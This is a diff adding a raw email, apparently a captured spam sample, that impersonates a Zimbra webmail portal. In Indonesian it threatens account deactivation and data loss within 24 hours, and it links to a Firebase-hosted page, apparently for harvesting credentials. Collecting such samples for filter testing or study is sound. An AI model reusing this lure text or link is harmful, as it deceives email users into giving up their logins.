@@ -1,0 +1,175 @@
+Return-Path: <storm.smith@democorp.com>
+X-Original-To: drewjones@testmail.net
+Delivered-To: drewjones@testmail.net
+Received: from okusi0 (okusi0 [192.168.1.153])
+	by okusi0.okusi.co.id (Postfix) with ESMTP id 9703A33401FE
+	for <drewjones@testmail.net>; Thu, 29 May 2025 03:00:55 +0700 (WIB)
+Received: from okusi1 [192.168.1.151]
+	by okusi0 with IMAP (fetchmail-6.4.27)
+	for <drewjones@testmail.net> (single-drop); Thu, 29 May 2025 03:00:55 +0700 (WIB)
+Received: from okusi1.okusi.co.id
+	by okusi1 with LMTP
+	id LftJD05rN2jpxhYAeHbnHg
+	(envelope-from <storm.smith@democorp.com>); Thu, 29 May 2025 03:00:14 +0700
+Authentication-Results: OpenDMARC; dmarc=pass (p=quarantine dis=none) header.from=uzbektourism.uz
+Authentication-Results: OpenDMARC; spf=pass smtp.mailfrom=uzbektourism.uz
+Received: from ns1.uzbektourism.uz (uzbektourism.uz [185.8.212.70])
+	by okusi1.okusi.co.id (Postfix) with ESMTPS id 62FCD2640033
+	for <legmorganhill@testdomain.io>; Thu, 29 May 2025 03:00:10 +0700 (WIB)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=uzbektourism.uz; s=mail; h=Content-Type:Message-ID:Subject:To:From:Date:
+	MIME-Version:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=E970LDVR4PXXT4rpKpUok1Zx8QhgyapKRj87lJutw4o=; b=q4bLVu5FG28A9Hl6CCB0Y8gOFs
+	N1x1CAAXNkQjjij5yEG0qw9Jc/1OyoFam42x5zvx1q7VP5lQCi95THVC/m1TZTQs3zCNKZXI+IXpM
+	yAsn8TQXbL22vr15ydZ+p1twtd/iBO5WxRhpJ378HW7iDs6YpjYPhHfsjeXCFVGqMpOI=;
+Received: from [127.0.0.1] (port=45802 helo=webmail.uzbektourism.uz)
+	by ns1.uzbektourism.uz with esmtpa (Exim 4.92.3)
+	(envelope-from <storm.smith@democorp.com>)
+	id 1uKLuk-0002Zr-Dq; Wed, 28 May 2025 23:54:10 +0500
+MIME-Version: 1.0
+Date: Wed, 28 May 2025 19:54:10 +0100
+From: Z!mbra Portal ! <storm.smith@democorp.com>
+To: undisclosed-recipients:;
+Subject: [***** SPAM 5.6 *****] Permintaan Penonaktifan Email
+User-Agent: Roundcube Webmail/1.4.9
+Message-ID: <bcd87d12d72e3d5a398813040d487ab0@democorp.com>
+X-Sender: storm.smith@democorp.com
+Content-Type: multipart/alternative;
+ boundary="=_9de3b509202bae9849ca64a87fe223cb"
+X-Spam-Flag: YES
+X-Spam-Status: Yes, score=5.6 required=5.0 tests=DKIM_INVALID,DKIM_SIGNED,
+	GOOG_STO_NOIMG_HTML,HTML_MESSAGE,KHOP_HELO_FCRDNS,LIST_UNSUBSCRIBE,
+	RCVD_IN_MSPIKE_H2,RCVD_IN_VALIDITY_CERTIFIED_BLOCKED,
+	RCVD_IN_VALIDITY_RPBL_BLOCKED,T_SPF_HELO_TEMPERROR,T_SPF_TEMPERROR,
+	URIBL_BLOCKED autolearn=no autolearn_force=no version=3.4.6
+X-Spam-Report: 
+	*  2.0 LIST_UNSUBSCRIBE I didn't join your mailing list.
+	*  0.0 T_SPF_HELO_TEMPERROR SPF: test of HELO record failed
+	*      (temperror)
+	*  0.0 T_SPF_TEMPERROR SPF: test of record failed (temperror)
+	*  0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was
+	*      blocked.  See
+	*      http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+	*      for more information.
+	*      [URIs: uzbektourism.uz]
+	*  0.0 RCVD_IN_MSPIKE_H2 RBL: Average reputation (+2)
+	*      [185.8.212.70 listed in wl.mailspike.net]
+	*  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
+	*      query to Validity was blocked.  See
+	*      https://knowledge.validity.com/hc/en-us/articles/20961730681243
+	*       for more information.
+	*      [185.8.212.70 listed in bl.score.senderscore.com]
+	*  0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
+	*      The query to Validity was blocked.  See
+	*      https://knowledge.validity.com/hc/en-us/articles/20961730681243
+	*       for more information.
+	*      [185.8.212.70 listed in sa-trusted.bondedsender.org]
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.1 DKIM_SIGNED Message has a DKIM or DK signature, not necessarily
+	*       valid
+	*  0.1 DKIM_INVALID DKIM or DK signature exists, but is not valid
+	*  3.0 GOOG_STO_NOIMG_HTML Apparently using google content hosting to
+	*      avoid URIBL
+	*  0.4 KHOP_HELO_FCRDNS Relay HELO differs from its IP's reverse DNS
+X-Spam-Level: *****
+X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on okusi1.okusi.co.id
+
+--=_9de3b509202bae9849ca64a87fe223cb
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset=US-ASCII;
+ format=flowed
+
+-- 
+
+Hai
+
+Kami telah menerima permintaan penonaktifan akun Email Anda dan 
+permintaan ini akan diproses dalam waktu 24 jam. Jika permintaan ini 
+dibuat secara tidak sengaja atau karena kesalahan atau Anda tidak 
+mengetahuinya, Anda disarankan untuk membatalkan permintaan sekarang. 
+Namun, jika Anda tidak membatalkan permintaan ini, akun Anda akan segera 
+ditutup dan semua data email Anda akan hilang secara permanen.
+
+  		BATALKAN PENONAKTIFAN DI SINI [1]
+
+Terima kasih Portal Z!mbra!
+
+Links:
+------
+[1] 
+https://firebasestorage.googleapis.com/v0/b/update-435a7.appspot.com/o/natheindex.html?alt=media&amp;token=d0687d6d-f95c-40c4-90d6-57efc43234d7
+--=_9de3b509202bae9849ca64a87fe223cb
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=UTF-8
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3DUTF-8" /></head><body style=3D'font-size: 10pt; font-family: Verdana,Gen=
+eva,sans-serif'>
+<p><br /></p>
+<div id=3D"signature">-- <br />
+<div dir=3D"ltr">
+<div id=3D":1uq" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY">
+<div dir=3D"ltr">
+<div dir=3D"ltr">
+<div id=3D":20s" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY">
+<div id=3D":2nc" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY">
+<div id=3D":1u3" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY">
+<div dir=3D"ltr">
+<div dir=3D"ltr">
+<div dir=3D"ltr">
+<div dir=3D"ltr">
+<div dir=3D"ltr">
+<div id=3D":75o" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY">
+<div dir=3D"ltr">
+<div id=3D":578" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY">
+<div id=3D":21w" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY">
+<div dir=3D"ltr">
+<div dir=3D"ltr">
+<div dir=3D"ltr">Hai<br /><br />Kami telah menerima permintaan penonaktifan=
+ akun Email Anda dan permintaan ini akan diproses dalam waktu 24 jam. Jika =
+permintaan ini dibuat secara tidak sengaja atau karena kesalahan atau Anda =
+tidak mengetahuinya, Anda disarankan untuk membatalkan permintaan sekarang=
+=2E Namun, jika Anda tidak membatalkan permintaan ini, akun Anda akan seger=
+a ditutup dan semua data email Anda akan hilang secara permanen.<br /><br /=
+>
+<table border=3D"0" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" bgco=
+lor=3D"#ffffff">
+<tbody>
+<tr>
+<td height=3D"20">&nbsp;</td>
+</tr>
+<tr>
+<td align=3D"center" valign=3D"top" width=3D"48%"><span><a href=3D"https://=
+firebasestorage.googleapis.com/v0/b/update-435a7.appspot.com/o/natheindex=
+=2Ehtml?alt=3Dmedia&amp;token=3Dd0687d6d-f95c-40c4-90d6-57efc43234d7" rel=
+=3D"noopener noreferrer">BATALKAN PENONAKTIFAN DI SINI </a></span></td>
+</tr>
+</tbody>
+</table>
+</div>
+<div dir=3D"ltr">Terima kasih Portal Z!mbra!</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</body></html>
+
+--=_9de3b509202bae9849ca64a87fe223cb--
